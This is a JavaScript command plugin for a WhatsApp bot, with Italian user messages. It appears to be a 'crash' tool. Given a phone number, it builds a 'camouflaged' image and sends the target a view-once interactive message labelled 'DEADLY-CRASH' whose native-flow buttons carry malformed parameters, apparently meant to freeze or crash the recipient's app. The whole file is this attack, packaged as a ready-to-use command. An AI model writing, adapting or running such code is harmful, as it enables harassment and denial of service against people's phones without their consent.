import { createCanvas } from 'canvas'
import { generateWAMessageFromContent, generateWAMessageContent } from '@realvare/baileys'

let handler = async (m, { conn, text, command }) => {
  if (!text) return m.reply(`📌 Usa così:\n.${command} numero\n\nEsempio:\n.${command} 393471234567`)

  let target = `${text.replace(/[^0-9]/g, '')}@s.whatsapp.net`

  try {
    // genera immagine camuffata
    const width = 800
    const height = 600
    const canvas = createCanvas(width, height)
    const ctx = canvas.getContext('2d')

    ctx.fillStyle = '#000'
    ctx.fillRect(0, 0, width, height)

    ctx.fillStyle = '#ff0000'
    ctx.font = 'bold 60px Arial'
    ctx.textAlign = 'center'
    ctx.fillText('𝐃𝐄𝐀𝐃𝐋𝐘 𝐃𝐎𝐌𝐈𝐍𝐀', width / 2, height / 2)

    const buffer = canvas.toBuffer()

    let prepared = await generateWAMessageContent(
      { image: buffer },
      { upload: conn.waUploadToServer }
    )

    let msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: true,
              imageMessage: prepared.imageMessage
            },
            body: {
              text: "𝐃𝐄𝐀𝐃𝐋𝐘-𝐂𝐑𝐀𝐒𝐇"
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                { name: "single_select", buttonParamsJson: "z" },
                { name: "call_permission_request", buttonParamsJson: "{}" }
              ]
            }
          }
        }
      }
    }, {})

    await conn.relayMessage(target, msg.message, { messageId: msg.key.id })

    m.reply(`✅ Foto camuffata inviata a ${text}`)
  } catch (e) {
    console.error(e)
    m.reply("❌ Errore durante l'invio: " + e.message)
  }
}

handler.command = /^delay$/i
export default handler